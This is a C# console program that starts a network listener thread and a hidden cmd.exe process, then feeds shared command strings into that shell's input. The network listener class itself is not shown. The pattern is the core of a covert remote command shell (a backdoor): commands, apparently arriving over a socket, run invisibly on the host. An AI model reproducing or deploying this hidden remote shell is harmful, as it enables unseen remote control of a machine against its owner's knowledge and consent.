using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace CMD
{
    public class Alpha
    {

        // This method that will be called when the thread is started
        public void Beta()
        {
            while (true)
            {
                Console.WriteLine("Alpha.Beta is running in its own thread.");
            }
        }
    };

    public class Program
    {
        public static StreamWriter cmd_writer;
        public static readonly object cmdLock = new object();
        public static string cmdString = "";

         static void Main(string[] args)
         {
             // creating a seprate thread to run the network
             AsynchronousSocketListener network = new AsynchronousSocketListener();

             Thread networkThread = new Thread(new ThreadStart(network.StartListening));

             // Start the thread may need to spin for a bit: while (!networkThread.IsAlive) ;
             networkThread.Start();

             lock (cmdLock)
             {
                 CreateCmdWindow();
                 Monitor.PulseAll(cmdLock);
             }

             // this is my event loop
             while(true)
             {
                 lock (cmdLock)
                 {
                     while (cmdString == "")
                     {
                         // to reduce buisy waiting
                         Monitor.Wait(cmdLock);
                     }
                     ConsoleCall(cmdString);
                     Monitor.PulseAll(cmdLock);
                 }
             }
             
         }

        private static void CreateCmdWindow()
        {
            //creating a new process
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            // makes command line window hidden
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            //calling process name
            startInfo.FileName = "cmd.exe";

            //establish that I want to use the console as an output stream (receives input from my output)s
            startInfo.RedirectStandardInput = true;
            startInfo.UseShellExecute = false;

            process.StartInfo = startInfo;
            process.Start();

            cmd_writer = process.StandardInput;
         }

         public static void ConsoleCall(string cmd_output)
         {
             cmd_writer.WriteLine(cmd_output);
             cmdString = "";
         }
    };
}